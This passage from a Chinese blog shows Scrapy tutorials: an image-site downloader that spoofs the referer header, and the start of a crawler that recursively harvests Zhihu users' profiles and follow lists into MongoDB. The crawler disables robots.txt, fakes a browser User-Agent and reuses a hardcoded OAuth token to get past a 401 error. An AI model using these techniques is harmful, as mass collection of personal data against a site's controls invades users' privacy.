每套图的分类目录</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        item = request.meta[<span class="string">'item'</span>]</span><br><span class="line">        folder = item[<span class="string">'name'</span>]</span><br><span class="line">        folder_strip = strip(folder)</span><br><span class="line">        image_guid = request.url.split(<span class="string">'/'</span>)[<span class="number">-1</span>]</span><br><span class="line">        filename = <span class="string">u'full/&#123;0&#125;/&#123;1&#125;'</span>.format(folder_strip, image_guid)</span><br><span class="line">        <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_media_requests</span><span class="params">(self, item, info)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :param item: spider.py中返回的item</span></span><br><span class="line"><span class="string">        :param info:</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">for</span> img_url <span class="keyword">in</span> item[<span class="string">'image_urls'</span>]:</span><br><span class="line">            referer = item[<span class="string">'url'</span>]</span><br><span class="line">            <span class="keyword">yield</span> Request(img_url, meta=&#123;<span class="string">'item'</span>: item,</span><br><span class="line">                                         <span class="string">'referer'</span>: referer&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">item_completed</span><span class="params">(self, results, item, info)</span>:</span></span><br><span class="line">        image_paths = [x[<span class="string">'path'</span>] <span class="keyword">for</span> ok, x <span class="keyword">in</span> results <span class="keyword">if</span> ok]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> image_paths:</span><br><span class="line">            <span class="keyword">raise</span> DropItem(<span class="string">"Item contains no images"</span>)</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line">    <span class="comment"># def process_item(self, item, spider):</span></span><br><span class="line">    <span class="comment">#     return item</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strip</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    :param path: 需要清洗的文件夹名字</span></span><br><span class="line"><span class="string">    :return: 清洗掉Windows系统非法文件夹名字的字符串</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    path = re.sub(<span class="string">r'[？\*|“&lt;&gt;:/]'</span>, <span class="string">''</span>, str(path))</span><br><span class="line">    <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    a = <span class="string">'我是一个？*|“&lt;&gt;:/错误的字符串'</span></span><br><span class="line">    print(strip(a))</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>写一个中间件来处理图片下载的防盗链：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MeiZiTu</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_request</span><span class="params">(self, request, spider)</span>:</span></span><br><span class="line">        <span class="string">'''设置headers和切换请求头</span></span><br><span class="line"><span class="string">        :param request: 请求体</span></span><br><span class="line"><span class="string">        :param spider: spider对象</span></span><br><span class="line"><span class="string">        :return: None</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        referer = request.meta.get(<span class="string">'referer'</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> referer:</span><br><span class="line">            request.headers[<span class="string">'referer'</span>] = referer</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>最后一步设置 ImagesPipeline 的存储目录！ 在 settings.py 中写入：</p>
                  <figure class="highlight ini">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attr">IMAGES_STORE</span> = <span class="string">'F:\mzitu\\'</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>则 ImagesPipeline 将所有下载的图片放置在此目录下！ 设置图片实效性： 图像管道避免下载最近已经下载的图片。使用 <a href="http://scrapy-chs.readthedocs.io/zh_CN/1.0/topics/media-pipeline.html#std:setting-FILES_EXPIRES" target="_blank" rel="noopener"><code>FILES_EXPIRES</code></a> (或 <a href="http://scrapy-chs.readthedocs.io/zh_CN/1.0/topics/media-pipeline.html#std:setting-IMAGES_EXPIRES" target="_blank" rel="noopener"><code>IMAGES_EXPIRES</code></a>) 设置可以调整失效期限，可以用天数来指定: 在 settings.py 中写入以下配置。</p>
                  <figure class="highlight ini">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment"># 30 days of delay for images expiration</span></span><br><span class="line"><span class="attr">IMAGES_EXPIRES</span> = <span class="number">30</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>settings.py 中开启 item_pipelines:</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">ITEM_PIPELINES</span> = &#123;</span><br><span class="line">   <span class="string">'mzitu_scrapy.pipelines.MzituScrapyPipeline'</span>: 300,</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>settings.py 中开启 DOWNLOADER_MIDDLEWARES</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">DOWNLOADER_MIDDLEWARES</span> = &#123;</span><br><span class="line">   <span class="string">'mzitu_scrapy.middlewares.MeiZiTu'</span>: 543,</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>如果你需要缩略图之类的请参考官方文档： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/04/mzitu05.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/04/mzitu05.png" alt=""></a> 将其写入 settings.py 文件中。 至此完毕！！！ 来看看效果： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/04/mzitu04.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/04/mzitu04.png" alt=""></a> 下载速度简直飞起！！友情提示：请务必配置代理哦！ 可以参考大才哥的<a href="http://cuiqingcai.com/3443.html做一个代理，就不需要重写Scrapy中间件啦！更能避免费代理总是不能用的坑爹行为。">http://cuiqingcai.com/3443.html做一个代理，就不需要重写Scrapy中间件啦！更能避免费代理总是不能用的坑爹行为。</a> 总之省事省时又省心啊！ github 地址：<a href="https://github.com/thsheep/mzitu_scrapy" target="_blank" rel="noopener">https://github.com/thsheep/mzitu_scrapy</a></p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/哎哟卧槽" class="author" itemprop="url" rel="index">哎哟卧槽</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2017-04-24 00:37:29" itemprop="dateCreated datePublished" datetime="2017-04-24T00:37:29+08:00">2017-04-24</time>
                </span>
                <span id="/4421.html" class="post-meta-item leancloud_visitors" data-flag-title="小白进阶之Scrapy第四篇（图片下载管道篇）" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>8.5k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>8 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/4380.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/4380.html" class="post-title-link" itemprop="url">利用Scrapy爬取知乎用户详细信息并存至MongoDB</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>本节分享一下爬取知乎用户信息的Scrapy爬虫实战。</p>
                  <h2 id="本节目标"><a href="#本节目标" class="headerlink" title="本节目标"></a>本节目标</h2>
                  <p>本节要实现的内容有：</p>
                  <ul>
                    <li>从一个大V用户开始，通过递归抓取粉丝列表和关注列表，实现知乎所有用户的详细信息的抓取。</li>
                    <li>将抓取到的结果存储到MongoDB，并进行去重操作。</li>
                  </ul>
                  <h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2>
                  <p>我们都知道每个人都有关注列表和粉丝列表，尤其对于大V来说，粉丝和关注尤其更多。 如果我们从一个大V开始，首先可以获取他的个人信息，然后我们获取他的粉丝列表和关注列表，然后遍历列表中的每一个用户，进一步抓取每一个用户的信息还有他们各自的粉丝列表和关注列表，然后再进一步遍历获取到的列表中的每一个用户，进一步抓取他们的信息和关注粉丝列表，循环往复，不断递归，这样就可以做到一爬百，百爬万，万爬百万，通过社交关系自然形成了一个爬取网，这样就可以爬到所有的用户信息了。当然零粉丝零关注的用户就忽略他们吧～ 爬取的信息怎样来获得呢？不用担心，通过分析知乎的请求就可以得到相关接口，通过请求接口就可以拿到用户详细信息和粉丝、关注列表了。 接下来我们开始实战爬取。</p>
                  <h2 id="环境需求"><a href="#环境需求" class="headerlink" title="环境需求"></a>环境需求</h2>
                  <h3 id="Python3"><a href="#Python3" class="headerlink" title="Python3"></a>Python3</h3>
                  <p>本项目使用的Python版本是Python3，项目开始之前请确保你已经安装了Python3。</p>
                  <h3 id="Scrapy"><a href="#Scrapy" class="headerlink" title="Scrapy"></a>Scrapy</h3>
                  <p>Scrapy是一个强大的爬虫框架，安装方式如下：</p>
                  <figure class="highlight cmake">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">pip3 <span class="keyword">install</span> scrapy</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h3 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h3>
                  <p>非关系型数据库，项目开始之前请先安装好MongoDB并启动服务。</p>
                  <h3 id="PyMongo"><a href="#PyMongo" class="headerlink" title="PyMongo"></a>PyMongo</h3>
                  <p>Python的MongoDB连接库，安装方式如下：</p>
                  <figure class="highlight cmake">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">pip3 <span class="keyword">install</span> pymongo</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2>
                  <p>安装好以上环境之后，我们便可以开始我们的项目了。 在项目开始之首先我们用命令行创建一个项目：</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">scrapy startproject zhihuuser</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h2 id="创建爬虫"><a href="#创建爬虫" class="headerlink" title="创建爬虫"></a>创建爬虫</h2>
                  <p>接下来我们需要创建一个spider，同样利用命令行，不过这次命令行需要进入到项目里运行。</p>
                  <figure class="highlight css">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="selector-tag">cd</span> <span class="selector-tag">zhihuuser</span></span><br><span class="line"><span class="selector-tag">scrapy</span> <span class="selector-tag">genspider</span> <span class="selector-tag">zhihu</span> <span class="selector-tag">www</span><span class="selector-class">.zhihu</span><span class="selector-class">.com</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h2 id="禁止ROBOTSTXT-OBEY"><a href="#禁止ROBOTSTXT-OBEY" class="headerlink" title="禁止ROBOTSTXT_OBEY"></a>禁止ROBOTSTXT_OBEY</h2>
                  <p>接下来你需要打开settings.py文件，将ROBOTSTXT_OBEY修改为False。</p>
                  <figure class="highlight ini">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attr">ROBOTSTXT_OBEY</span> = <span class="literal">False</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>它默认为True，就是要遵守robots.txt 的规则，那么 robots.txt 是个什么东西呢？ 通俗来说， robots.txt 是遵循 Robot 协议的一个文件，它保存在网站的服务器中，它的作用是，告诉搜索引擎爬虫，本网站哪些目录下的网页 不希望 你进行爬取收录。在Scrapy启动后，会在第一时间访问网站的 robots.txt 文件，然后决定该网站的爬取范围。 当然，我们并不是在做搜索引擎，而且在某些情况下我们想要获取的内容恰恰是被 robots.txt 所禁止访问的。所以，某些时候，我们就要将此配置项设置为 False ，拒绝遵守 Robot协议 ！ 所以在这里设置为False。当然可能本次爬取不一定会被它限制，但是我们一般来说会首先选择禁止它。</p>
                  <h2 id="尝试最初的爬取"><a href="#尝试最初的爬取" class="headerlink" title="尝试最初的爬取"></a>尝试最初的爬取</h2>
                  <p>接下来我们什么代码也不修改，执行爬取，运行如下命令：</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">scrapy crawl zhihu</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>你会发现爬取结果会出现这样的一个错误：</p>
                  <figure class="highlight basic">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="symbol">500 </span>Internal Server <span class="keyword">Error</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>访问知乎得到的状态码是500，这说明爬取并没有成功，其实这是因为我们没有加入请求头，知乎识别User-Agent发现不是浏览器，就返回错误的响应了。 所以接下来的一步我们需要加入请求headers信息，你可以在Request的参数里加，也可以在spider里面的custom_settings里面加，当然最简单的方法莫过于在全局settings里面加了。 我们打开settings.py文件，取消DEFAULT_REQUEST_HEADERS的注释，加入如下的内容：</p>
                  <figure class="highlight 1c">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">DEFAULT_REQUEST_HEADERS = &#123;</span><br><span class="line">    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.<span class="number">2924.87</span> Safari/537.36'</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这个是为你的请求添加请求头，如果你没有设置headers的话，它就会使用这个请求头请求，添加了User-Agent信息，所以这样我们的爬虫就可以伪装浏览器了。 接下来重新运行爬虫。</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">scrapy crawl zhihu</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这时你就会发现得到的返回状态码就正常了。 解决了这个问题，我们接下来就可以分析页面逻辑来正式实现爬虫了。</p>
                  <h2 id="爬取流程"><a href="#爬取流程" class="headerlink" title="爬取流程"></a>爬取流程</h2>
                  <p>接下来我们需要先探寻获取用户详细信息和获取关注列表的接口。 回到网页，打开浏览器的控制台，切换到Network监听模式。 我们首先要做的是寻找一个大V，以轮子哥为例吧，它的个人信息页面网址是：<a href="https://www.zhihu.com/people/excited-vczh" target="_blank" rel="noopener">https://www.zhihu.com/people/excited-vczh</a> 首先打开轮子哥的首页 <img src="https://ww4.sinaimg.cn/large/006tKfTcly1femrd0w9qwj31kw145n1v.jpg" alt=""> 我们可以看到这里就是他的一些基本信息，我们需要抓取的就是这些，比如名字、签名、职业、关注数、赞同数等等。 接下来我们需要探索一下关注列表接口在哪里，我们点击关注选项卡，然后下拉，点击翻页，我们会在下面的请求中发现出现了 followees开头的Ajax请求。这个就是获取关注列表的接口。 <img src="https://ww1.sinaimg.cn/large/006tKfTcly1femrhdtpkoj31kw0y7jw5.jpg" alt=""> 我们观察一下这个请求结构 <img src="https://ww3.sinaimg.cn/large/006tKfTcly1femrk47kt9j31ho0sejwx.jpg" alt=""> 首先它是一个Get类型的请求，请求的URL是<a href="https://www.zhihu.com/api/v4/members/excited-vczh/followees" target="_blank" rel="noopener">https://www.zhihu.com/api/v4/members/excited-vczh/followees</a>，后面跟了三个参数，一个是include，一个是offset，一个是limit。 观察后可以发现，include是一些获取关注的人的基本信息的查询参数，包括回答数、文章数等等。 offset是偏移量，我们现在分析的是第3页的关注列表内容，offset当前为40。 limit为每一页的数量，这里是20，所以结合上面的offset可以推断，当offset为0时，获取到的是第一页关注列表，当offset为20时，获取到的是第二页关注列表，依次类推。 然后接下来看下返回结果： <img src="https://ww3.sinaimg.cn/large/006tKfTcly1femrpgchhpj31ec0ss0wb.jpg" alt=""> 可以看到有data和paging两个字段，data就是数据，包含20个内容，这些就是用户的基本信息，也就是关注列表的用户信息。 paging里面又有几个字段，is_end表示当前翻页是否结束，next是下一页的链接，所以在判读分页的时候，我们可以先利用is_end判断翻页是否结束，然后再获取next链接，请求下一页。 这样我们的关注列表就可以通过接口获取到了。 接下来我们再看下用户详情接口在哪里，我们将鼠标放到关注列表任意一个头像上面，观察下网络请求，可以发现又会出现一个Ajax请求。 <img src="https://ww3.sinaimg.cn/large/006tKfTcly1femrumazrij31kw0zjk1e.jpg" alt=""> 可以看到这次的请求链接为<a href="https://www.zhihu.com/api/v4/members/lu-jun-ya-1" target="_blank" rel="noopener">https://www.zhihu.com/api/v4/members/lu-jun-ya-1</a> 后面又一个参数include，include是一些查询参数，与刚才的接口类似，不过这次参数非常全，几乎可以把所有详情获取下来，另外接口的最后是加了用户的用户名，这个其实是url_token，上面的那个接口其实也是，在返回数据中是可以获得的。 <img src="https://ww4.sinaimg.cn/large/006tKfTcly1femrxhb8ptj313w0qy76m.jpg" alt=""> 所以综上所述：</p>
                  <ul>
                    <li>要获取用户的关注列表，我们需要请求类似 <a href="https://www.zhihu.com/api/v4/members/%7Buser%7D/followees?include={include}&amp;offset={offset}&amp;limit={limit}" target="_blank" rel="noopener">https://www.zhihu.com/api/v4/members/{user}/followees?include={include}&amp;offset={offset}&amp;limit={limit}</a> 这样的接口，其中user就是该用户的url_token，include是固定的查询参数，offset是分页偏移量，limit是一页取多少个。</li>
                    <li>要获取用户的详细信息，我们需要请求类似 <a href="https://www.zhihu.com/api/v4/members/%7Buser%7D?include={include}" target="_blank" rel="noopener">https://www.zhihu.com/api/v4/members/{user}?include={include}</a> 这样的接口，其中user就是该用户的url_token，include是查询参数。</li>
                  </ul>
                  <p>理清了如上接口逻辑后，我们就可以开始构造请求了。</p>
                  <h2 id="生成第一步请求"><a href="#生成第一步请求" class="headerlink" title="生成第一步请求"></a>生成第一步请求</h2>
                  <p>接下来我们要做的第一步当然是请求轮子哥的基本信息，然后获取轮子哥的关注列表了，我们首先构造一个格式化的url，将一些可变参数提取出来，然后需要重写start_requests方法，生成第一步的请求，接下来我们还需要根据获取到到关注列表做进一步的分析。</p>
                  <figure class="highlight reasonml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">import json</span><br><span class="line">from scrapy import Spider, Request</span><br><span class="line">from zhihuuser.items import UserItem</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="constructor">ZhihuSpider(Spider)</span>:</span><br><span class="line">    name = <span class="string">"zhihu"</span></span><br><span class="line">    allowed_domains = <span class="literal">["<span class="identifier">www</span>.<span class="identifier">zhihu</span>.<span class="identifier">com</span>"]</span></span><br><span class="line">    user_url = 'https:<span class="comment">//www.zhihu.com/api/v4/members/&#123;user&#125;?include=&#123;include&#125;'</span></span><br><span class="line">    follows_url = 'https:<span class="comment">//www.zhihu.com/api/v4/members/&#123;user&#125;/followees?include=&#123;include&#125;&amp;amp;offset=&#123;offset&#125;&amp;amp;limit=&#123;limit&#125;'</span></span><br><span class="line">    start_user = 'excited-vczh'</span><br><span class="line">    user_query = 'locations,employments,gender,educations,business,voteup_count,thanked_Count,follower_count,following_count,cover_url,following_topic_count,following_question_count,following_favlists_count,following_columns_count,answer_count,articles_count,pins_count,question_count,commercial_question_count,favorite_count,favorited_count,logs_count,marked_answers_count,marked_answers_text,message_thread_token,account_status,is_active,is_force_renamed,is_bind_sina,sina_weibo_url,sina_weibo_name,show_sina_weibo,is_blocking,is_blocked,is_following,is_followed,mutual_followees_count,vote_to_count,vote_from_count,thank_to_count,thank_from_count,thanked_count,description,hosted_live_count,participated_live_count,allow_message,industry_category,org_name,org_homepage,badge<span class="literal">[?(<span class="identifier">type</span>=<span class="identifier">best_answerer</span>)]</span>.topics'</span><br><span class="line">    follows_query = 'data<span class="literal">[<span class="operator">*</span>]</span>.answer_count,articles_count,gender,follower_count,is_followed,is_following,badge<span class="literal">[?(<span class="identifier">type</span>=<span class="identifier">best_answerer</span>)]</span>.topics'</span><br><span class="line"></span><br><span class="line">    def start<span class="constructor">_requests(<span class="params">self</span>)</span>:</span><br><span class="line">        yield <span class="constructor">Request(<span class="params">self</span>.<span class="params">user_url</span>.<span class="params">format</span>(<span class="params">user</span>=<span class="params">self</span>.<span class="params">start_user</span>, <span class="params">include</span>=<span class="params">self</span>.<span class="params">user_query</span>)</span>, self.parse_user)</span><br><span class="line">        yield <span class="constructor">Request(<span class="params">self</span>.<span class="params">follows_url</span>.<span class="params">format</span>(<span class="params">user</span>=<span class="params">self</span>.<span class="params">start_user</span>, <span class="params">include</span>=<span class="params">self</span>.<span class="params">follows_query</span>, <span class="params">limit</span>=20, <span class="params">offset</span>=0)</span>,</span><br><span class="line">                      self.parse_follows)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>然后我们实现一下两个解析方法parse_user和parse_follows。</p>
                  <figure class="highlight ruby">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_user</span><span class="params">(<span class="keyword">self</span>, response)</span></span><span class="symbol">:</span></span><br><span class="line">    print(response.text)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_follows</span><span class="params">(<span class="keyword">self</span>, response)</span></span><span class="symbol">:</span></span><br><span class="line">    print(response.text)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>最简单的实现他们的结果输出即可，然后运行观察结果。</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">scrapy crawl zhihu</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这时你会发现出现了</p>
                  <figure class="highlight basic">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="symbol">401 </span>HTTP status code is <span class="keyword">not</span> handled <span class="keyword">or</span> <span class="keyword">not</span> allowed</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>访问被禁止了，这时我们观察下浏览器请求，发现它相比之前的请求多了一个OAuth请求头。 <img src="https://ww3.sinaimg.cn/large/006tKfTcly1femsckhmbxj30zy0qsaem.jpg" alt=""></p>
                  <h2 id="OAuth"><a href="#OAuth" class="headerlink" title="OAuth"></a>OAuth</h2>
                  <p>它是Open Authorization的缩写。 OAUTH_token:OAUTH进行到最后一步得到的一个“令牌”，通过此“令牌”请求，就可以去拥有资源的网站抓取任意有权限可以被抓取的资源。 在这里我知乎并没有登陆，这里的OAuth值是</p>
                  <figure class="highlight llvm">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">oauth <span class="keyword">c</span><span class="number">3</span>cef<span class="number">7</span><span class="keyword">c</span><span class="number">66</span>a<span class="number">1843</span>f<span class="number">8</span>b<span class="number">3</span>a<span class="number">9e6</span>a<span class="number">1e3160</span>e<span class="number">20</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>经过我长久的观察，这个一直不会改变，所以可以长久使用，我们将它配置到DEFAULT_REQUEST_HEADERS里，这样它就变成了：</p>
                  <figure class="highlight 1c">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">DEFAULT_REQUEST_HEADERS = &#123;</span><br><span class="line">    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.<span class="number">2924.87</span> Safari/537.36',</span><br><span class="line">    'authorization': 'oauth c3cef7c66a<span class="number">1843</span>f8b3a9e6a1e<span class="number">3160</span>e20',</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>接下来如果我们重新运行爬虫，就可以发现可以正常爬取了。</p>
                  <h2 id="parse-user"><a href="#parse-user" class="headerlink" title="parse_user"></a>parse_user</h2>
                  <p>接下来我们处理一下用户基本信息，首先我们查看一下接口信息会返回一些什么数据。 <img src="https://ww3.sinaimg.cn/large/006tKfTcly1femsgc32lzj31900r241a.jpg" alt=""> 可以看到返回的结果非常全，在这里我们直接声明一个Item全保存下就好了。 在items里新声明一个UserItem</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre>
                        </td>
                        <td class="code">
